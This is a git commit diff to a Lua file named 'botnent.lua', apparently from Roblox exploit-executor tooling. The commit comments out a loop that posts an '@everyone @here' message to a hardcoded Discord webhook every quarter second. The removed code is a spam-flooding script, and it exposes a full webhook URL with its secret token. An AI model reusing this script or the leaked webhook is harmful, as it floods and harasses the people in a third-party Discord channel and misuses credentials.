18d89bf25d70f38da1c5f0b9a0228c6524807e50
ThisAintComputin <142166632+ThisAintComputin@users.noreply.github.com>
2025-03-15 18:55:30 -0700

    Update botnent.lua

--- surpware/botnent.lua
+++ surpware/botnent.lua
@@ -1,32 +1,32 @@
-while task.wait(0.25) do
-    task.spawn(function()
-        -- Creating Webhook Data
-        local function createWebhookData()
-            local data = {
-        ["content"]="@everyone @here real surplus softworks!1!!!1",
-        ["embeds"]={},
-        ["attachments"]={}
-        }
-            return game:GetService("HttpService"):JSONEncode(data)
-        end
+-- while task.wait(0.25) do
+--     task.spawn(function()
+--         -- Creating Webhook Data
+--         local function createWebhookData()
+--             local data = {
+--         ["content"]="@everyone @here real surplus softworks!1!!!1",
+--         ["embeds"]={},
+--         ["attachments"]={}
+--         }
+--             return game:GetService("HttpService"):JSONEncode(data)
+--         end
 
-        -- Sending Webhook
-        local function sendWebhook(webhookUrl, data)
-            local headers = {
-                ["content-type"] = "application/json",
-            }
+--         -- Sending Webhook
+--         local function sendWebhook(webhookUrl, data)
+--             local headers = {
+--                 ["content-type"] = "application/json",
+--             }
 
-            local request = http_request or request or HttpPost or syn.request
-            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-            request(abcdef)
-        end
+--             local request = http_request or request or HttpPost or syn.request
+--             local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+--             request(abcdef)
+--         end
 
-        -- Replace the webhook URL with your own URL
-        local webhookUrl = "https://discordapp.com/api/webhooks/1339015241815818240/teSsf0baQ6-nDEFvnwwWHa8ijO8OEMqmRTIRjGG2ItapAG_O3hK9_OPoVOJkDgvEU7TV"
-        local webhookData = createWebhookData()
+--         -- Replace the webhook URL with your own URL
+--         local webhookUrl = "https://discordapp.com/api/webhooks/1339015241815818240/teSsf0baQ6-nDEFvnwwWHa8ijO8OEMqmRTIRjGG2ItapAG_O3hK9_OPoVOJkDgvEU7TV"
+--         local webhookData = createWebhookData()
 
-        -- Sending the webhook
-        sendWebhook(webhookUrl, webhookData)
-        print(webhookUrl)
-    end)
-end
+--         -- Sending the webhook
+--         sendWebhook(webhookUrl, webhookData)
+--         print(webhookUrl)
+--     end)
+-- end
